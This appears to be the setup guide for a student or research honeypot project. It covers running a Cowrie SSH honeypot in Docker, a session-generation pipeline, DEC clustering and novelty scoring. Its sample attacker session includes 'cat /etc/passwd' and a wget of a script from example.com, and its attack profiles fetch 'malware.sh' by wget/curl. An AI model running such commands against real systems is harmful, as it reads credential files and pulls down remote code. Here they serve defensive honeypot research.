# Setup Guide

This guide explains how to set up the Adaptive Zero-Day Honeypot project from scratch.

---

# Prerequisites

Install the following software:

- Docker Desktop
- WSL2 (Ubuntu)
- Git
- Python 3.11+

Verify installation:

```bash
docker --version
git --version
python3 --version
```

---

# Clone the Repository

```bash
git clone git@github.com:MadhumithraaTS/adaptive-zero-day-honeypot.git

cd adaptive-zero-day-honeypot
```

---

# Python Environment

Create a virtual environment.

```bash
python3 -m venv .venv
```

Activate it.

Linux / WSL

```bash
source .venv/bin/activate
```

Windows

```powershell
.venv\Scripts\activate
```

Install dependencies.

```bash
pip install -r requirements.txt
```

---

# Start the Cowrie Honeypot

Start Docker.

```bash
docker compose -f cowrie/docker-compose.yml up -d
```

Verify.

```bash
docker ps
```

You should see:

```
cowrie-project
```

---

# DEC Interpreter

The saved DEC artifacts in `ml/cowrie_dec_integration_skeleton/ml/cowrie_dec/artifacts/` were pickled with newer pandas and scikit-learn versions than the main `.venv`, so the main `.venv` cannot load them. DEC inference runs in a separate interpreter:

```
ml\cowrie_dec_integration_skeleton\.venv-dec-smoke\Scripts\python.exe
```

`scripts/pipeline.py` uses that interpreter for the DEC step by default and prints it as `DEC interpreter: ...` when it starts. All other steps run in the Python that launched the pipeline. To use a different DEC environment, pass it explicitly:

```powershell
python scripts/pipeline.py --cluster-python C:\path\to\dec-env\Scripts\python.exe ...
```

If the default interpreter is missing and `--cluster-python` is not given, the pipeline exits with a usage error instead of falling back to another Python.

Run the DEC script directly with the same interpreter:

```powershell
ml\cowrie_dec_integration_skeleton\.venv-dec-smoke\Scripts\python.exe ml\cowrie_dec_integration_skeleton\scripts\run_dec_evaluation.py path\to\behavior_features.csv --output path\to\dec_results.csv
```

---

# Run the Pipeline Safely

`scripts/pipeline.py` simulates sessions against Cowrie, collects and parses the logs, extracts features, optionally builds the auxiliary MinMax dataset, then runs the saved DEC model. It never retrains DEC or refits DEC's scaler.

## Outputs are never overwritten by default

Without `--output-dir`, the pipeline writes to the tracked baseline paths (`data/raw`, `data/parsed`, `data/processed`, `models/scaler.joblib`). Before any attack, collection or write, it checks every file it would produce. If any already exists, it stops with exit code 2 and lists them:

```
Error: refusing to overwrite existing pipeline outputs:
```

Choose one of:

- `--output-dir <new directory>`: write every output under that directory instead (recommended).
- `--allow-overwrite`: deliberately replace the existing files, including the tracked baseline. Back them up first.

## Options

| Option | Effect |
|---|---|
| `--output-dir DIR` | Writes `raw/cowrie.json`, `parsed/`, `processed/` and `models/scaler.joblib` under `DIR` instead of the tracked paths. |
| `--allow-overwrite` | Allows replacing existing output files. Required to rerun into a directory that already has outputs, or to replace the tracked baseline. |
| `--raw-input FILE` | Parses an existing Cowrie JSON log instead of collecting one. Log collection is skipped. |
| `--skip-attack` | Does not generate sessions. This also skips log collection, so combine it with `--raw-input`. |
| `--skip-collect` | Does not copy the log out of the container. |
| `--skip-preprocess` | Skips `preprocess_dataset.py`. That step only builds the auxiliary `model_input.csv` with its own MinMaxScaler; DEC does not use it. |
| `--sessions N`, `--attack-username U --attack-password P` | Number of generated sessions and fixed SSH credentials. |
| `--cluster-python PATH` | DEC interpreter (see above). |

Every step stops the pipeline on failure. `collect_logs.py`, `parse_logs.py` and `extract_features.py` exit non-zero on missing, empty, malformed or unwritable data, and never report an older file as a fresh result.

## Credentials

`--attack-username root --attack-password admin` uses a pair shown to succeed in this Cowrie container's logs. Without them, the attack generator picks random credentials; most of those are rejected, and each rejected login creates several failed-login sessions.

## Profiles

The generator picks a random profile per session from `configs/attack_profiles.json`. The `botnet` and `advanced_persistent_threat` profiles run `wget`/`curl`, and Cowrie performs those downloads for real from inside the container (for example, `http://example.com/malware.sh`).

---

# Run a Demonstration Without Touching the Baseline

Create a new run directory and generate a few sessions into it (PowerShell):

```powershell
$Run = "data\demo_" + (Get-Date -Format "yyyyMMdd_HHmmss")
python scripts/pipeline.py --sessions 3 --attack-username root --attack-password admin --output-dir $Run --skip-preprocess
```

Or reprocess an existing log without generating sessions:

```powershell
$Run = "data\demo_" + (Get-Date -Format "yyyyMMdd_HHmmss")
python scripts/pipeline.py --skip-attack --raw-input data\demo_20261019_213439\raw\cowrie.json --output-dir $Run --skip-preprocess
```

Then compare the sessions with the stored behaviour signatures:

```powershell
python scripts/novelty_assessment.py --session-details "$Run\parsed\session_details.json" --signature-file reports\novelty_assessment\held_out\revised\reference_signatures\behaviour_signatures.json --output-dir "$Run\novelty"
```

Results:

- `$Run\processed\dec_results.csv`: `session_id`, `dec_cluster`, `dec_confidence`, `cluster_0_prob` to `cluster_2_prob`.
- `$Run\novelty\novelty_assessment_results.csv` and `novelty_assessment_report.md`.

Cowrie's `cowrie.json` contains the whole current log, not only the new sessions. To select sessions that are not in a saved baseline, use `scripts/prepare_fresh_evaluation.py`.

---

# Interpreting the Results

## DEC clusters

- DEC was trained on 1,800 synthetic sessions from `scripts/generate_dataset.py`, not on live Cowrie traffic. Live sessions differ measurably from that data (for example, `tcprtt`/`synack` are much smaller), so treat assignments as indicative.
- In the training data, cluster 2 contains sessions with no commands (all brute-force-only sessions), cluster 1 contains longer interactive multi-command sessions, and cluster 0 contains short, high-rate sessions. These are behavioural groupings, not attack labels.
- `dec_confidence` is the largest soft-assignment probability. It is relative to the three clusters, so a session far from all of them can still get a high value; it is not an out-of-distribution score.
- `ct_srv_src` and `ct_src_ltm` are counted across all sessions in the processed log, so their values depend on how many sessions the log contains.
- Collected Cowrie sessions have no ground-truth labels (`extract_features.py` fills `label=0`). `run_dec_evaluation.py` therefore omits ARI/NMI unless `--labels-verified` is given and the labels contain at least two classes.

## Novelty categories

The score combines similarity on the signature's selected numerical features (70%), command-category overlap (20%) and authentication success (10%). It is a heuristic similarity score, not a probability.

- `Known-like`: score at least 0.70, clearly ahead of the next signature, and no contradicting command or authentication evidence.
- `Ambiguous`: two signatures score similarly; no decision.
- `Potentially Novel`: comparable evidence, but no signature matches closely. This means "does not fit the current catalogue", not a confirmed zero-day. A sparse catalogue can produce it for behaviour that was seen before.
- `Insufficient Evidence`: too few comparable features to decide.

`novelty_assessment_summary.json` and the Markdown report state the `evaluation_mode`:

- `independent`: none of the assessed session IDs were used to build the catalogue.
- `overlapping`: some were; those results are in-sample. The overlapping IDs are listed.
- `reference-provenance-unknown`: the catalogue does not record its source session IDs, so independence could not be checked.

---

# Connect to the Honeypot

Open another terminal.

```bash
ssh root@localhost -p 2223
```

Use the password `admin`. This Cowrie container rejects some passwords (for example `root` and `123456`) and all logins tried for `admin`, `user` and `guest`.

Run a few commands.

```bash
whoami
pwd
ls
cat /etc/passwd
wget http://example.com/test.sh
exit
```

These commands simulate attacker activity.

---

# Stop Cowrie

```bash
docker compose -f cowrie/docker-compose.yml down
```

---

# Git Workflow

Check changes.

```bash
git status
```

Add files.

```bash
git add .
```

Commit.

```bash
git commit -m "Your commit message"
```

Push.

```bash
git push
```

---

# Project Structure

```
zero_day_attacks/
│
├── cowrie/
├── scripts/
├── dataset/
├── parsed/
├── models/
├── notebooks/
├── docs/
│   ├── setup_guide.md
│   ├── report.pdf
│   └── presentation.pdf
│
├── docker-compose.yml
├── requirements.txt
└── README.md
```
